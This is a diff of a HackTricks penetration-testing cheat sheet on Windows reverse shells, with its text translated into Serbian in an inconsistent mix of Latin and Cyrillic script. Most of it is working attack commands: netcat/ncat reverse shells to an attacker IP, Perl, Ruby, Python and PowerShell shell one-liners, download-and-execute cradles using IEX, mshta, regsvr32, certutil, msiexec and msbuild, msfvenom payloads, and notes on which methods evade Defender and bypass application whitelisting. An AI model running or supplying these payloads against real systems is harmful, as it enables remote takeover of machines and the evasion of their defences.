@@ -1,16 +1,16 @@
-# Školjke - Windows
+# Shells - Windows
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -26,15 +26,28 @@ Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="
 ## Lolbas
 
 Stranica [lolbas-project.github.io](https://lolbas-project.github.io/) je za Windows kao što je [https://gtfobins.github.io/](https://gtfobins.github.io/) za linux.\
-Očigledno, **nema SUID fajlova ili sudo privilegija u Windows-u**, ali je korisno znati **kako** neki **binarni fajlovi** mogu biti (zlo)upotrebljeni da izvrše neku vrstu neočekivanih akcija poput **izvršavanja proizvoljnog koda.**
+Očigledno, **nema SUID datoteka ili sudo privilegija u Windows-u**, ali je korisno znati **kako** neki **binarni** fajlovi mogu biti (zlo)upotrebljeni za izvršavanje nekih neočekivanih akcija kao što je **izvršavanje proizvoljnog koda.**
 
 ## NC
 ```bash
 nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
+## NCAT
+žrtva
+```
+ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
+#Encryption to bypass firewall
+ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
+```
+нападач
+```
+ncat -l <PORT>
+#Encryption to bypass firewall
+ncat -l <PORT eg.443> --ssl
+```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i sigurna Netcat alternativa**. Radi na Unix-sličnim sistemima i Win32. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirana ponovna povezivanja, sbd pruža svestranu rešenje za TCP/IP komunikaciju. Za korisnike Windowsa, sbd.exe verzija iz distribucije Kali Linux može se koristiti kao pouzdana zamena za Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i sigurna alternativa za Netcat**. Radi na Unix-sličnim sistemima i Win32. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirana ponovna konekcija, sbd pruža svestrano rešenje za TCP/IP komunikaciju. Za korisnike Windows-a, sbd.exe verzija iz Kali Linux distribucije može se koristiti kao pouzdana zamena za Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -56,7 +69,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## Ruby
+## Руби
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -73,7 +86,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Žrtva
+Жртва
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -88,17 +101,19 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Proces koji vrši mrežni poziv: **powershell.exe**\
-Payload napisan na disku: **NE** (_bar nigde gde sam mogao da pronađem koristeći procmon!_)
+Proces koji obavlja mrežni poziv: **powershell.exe**\
+Payload napisan na disku: **NE** (_barem nigde gde sam mogao da pronađem koristeći procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Proces koji vrši mrežni poziv: **svchost.exe**\
-Payload napisan na disku: **Lokalni keš WebDAV klijenta**
+Proces koji izvršava mrežni poziv: **svchost.exe**\
+Payload napisan na disku: **WebDAV klijent lokalna keš memorija**
+
+**Jedna linija:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Dobijte više informacija o različitim Powershell Shell-ovima na kraju ovog dokumenta**
+**Dobijte više informacija o različitim Powershell Shells na kraju ovog dokumenta**
 
 ## Mshta
 
@@ -114,13 +129,13 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Primer hta-psh reverzibilne ljuske (koristi hta za preuzimanje i izvršavanje PS zadnjih vrata)**
+#### **Primer hta-psh reverzne ljuske (koristite hta za preuzimanje i izvršavanje PS backdoora)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Možete veoma lako preuzeti i izvršiti Koadic zombija koristeći stager hta**
+**Možete vrlo lako preuzeti i izvršiti Koadic zombija koristeći stager hta**
 
-#### Primer hta
+#### hta primer
 
 [**Odavde**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
@@ -166,7 +181,7 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 
 
@@ -183,7 +198,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 **Rundll32 - sct**
 
@@ -227,7 +242,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 #### Regsvr32 -sct
 
@@ -257,7 +272,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Možete veoma lako preuzeti i izvršiti Koadic zombija koristeći stager regsvr**
+**Možete lako preuzeti i izvršiti Koadic zombija koristeći stager regsvr**
 
 ## Certutil
 
@@ -271,7 +286,7 @@ Preuzmite B64exe, dekodirajte ga i izvršite.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 
 ## **Cscript/Wscript**
@@ -282,14 +297,14 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Proces koji vrši mrežni poziv: **svchost.exe**\
-Payload napisan na disku: **Lokalni keš WebDAV klijenta**
+Proces koji izvršava mrežni poziv: **svchost.exe**\
+Payload napisan na disku: **WebDAV klijent lokalna keš memorija**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -298,7 +313,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 ## **MSIExec**
 
@@ -307,7 +322,7 @@ Napadač
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Žrtva:
+Жртва:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -319,7 +334,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Primer xsl datoteke [ovde](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Primer xsl datoteke [odavde](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -333,7 +348,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Nije otkriveno**
 
-**Možete veoma lako preuzeti i izvršiti Koadic zombija koristeći stager wmic**
+**Možete vrlo lako preuzeti i izvršiti Koadic zombija koristeći stager wmic**
 
 ## Msbuild
 
@@ -341,7 +356,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Možete koristiti ovu tehniku da zaobiđete Whitelisting aplikacija i restrikcije Powershell.exe. Kada budete upitani, koristićete PS shell.\
+Možete koristiti ovu tehniku da zaobiđete pravila o beloj listi aplikacija i ograničenja za Powershell.exe. Bićete upitani da otvorite PS shell.\
 Jednostavno preuzmite ovo i izvršite: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -350,13 +365,13 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kompajlirajte C# kod na žrtvinom računaru.
+Kompajlirajte C# kod na žrtvenoj mašini.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Možete preuzeti osnovnu C# reverznu ljusku odavde: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Možete preuzeti osnovni C# reverzni shell odavde: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Nije otkriveno**
+**Nije detektovano**
 
 ## **Regasm/Regsvc**
 
@@ -364,7 +379,7 @@ Možete preuzeti osnovnu C# reverznu ljusku odavde: [https://gist.github.com/Ban
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**Nisam probao**
+**Nisam to probao**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
@@ -374,7 +389,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\fol
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-**Nisam probao**
+**Nisam to probao**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
@@ -384,31 +399,31 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-U **Shells** fascikli, nalazi se mnogo različitih shell-ova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_ napravite kopiju skripte i dodajte na kraj fajla:
+U **Shells** folderu, postoji mnogo različitih shellova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_, napravite kopiju skripte i dodajte na kraj datoteke:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Započnite posluživanje skripte na veb serveru i izvršite je na kraju žrtve:
+Почните да служите скрипту на веб серверу и извршите је на страни жртве:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender ne otkriva da je zlonamerni kod (još uvek, 3/04/2019).
+Defender još uvek ne prepoznaje kao zloćudni kod (do sada, 3/04/2019).
 
-**TODO: Proveriti druge nishang školjke**
+**TODO: Proveriti druge nishang shells**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Preuzmi, pokreni web server, pokreni osluškivač i izvrši ga na strani žrtve:
+Preuzmite, pokrenite web server, pokrenite slušalac i izvršite ga na strani žrtve:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender ne otkriva da je zlonamerni kod (još uvek, 3/04/2019).
+Defender ga još uvek ne prepoznaje kao zloćudni kod (do sada, 3/04/2019).
 
-**Druge opcije koje nudi powercat:**
+**Ostale opcije koje nudi powercat:**
 
-Bind shell-ovi, Reverse shell (TCP, UDP, DNS), Preusmeravanje porta, upload/download, Generisanje payload-a, Slanje fajlova...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -429,17 +444,17 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Kreirajte powershell pokretač, sačuvajte ga u datoteku i preuzmite i izvršite.
+Kreirajte powershell pokretač, sačuvajte ga u datoteci i preuzmite i izvršite ga.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Otkriven kao zlonamerni kod**
+**Otkriveno kao zlonamerni kod**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Kreirajte powershell verziju metasploit zadnjeg vrata koristeći unicorn
+Kreirajte powershell verziju metasploit backdoora koristeći unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -447,17 +462,17 @@ Pokrenite msfconsole sa kreiranim resursom:
 ```
 msfconsole -r unicorn.rc
 ```
-Pokrenite veb server koji služi datoteku _powershell\_attack.txt_ i izvršite na žrtvi:
+Pokrenite web server koji servira _powershell\_attack.txt_ datoteku i izvršite na žrtvi:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Otkriven kao zlonamerni kod**
+**Otkriveno kao zlonamerni kod**
 
 ## Više
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS konzola sa nekim ofanzivnim PS modulima unapred učitanim (šifrovano)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim PS modulima i otkrivanjem proksija (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim PS modulima i detekcijom proksija (IEX)
 
 ## Reference
 
@@ -476,16 +491,16 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
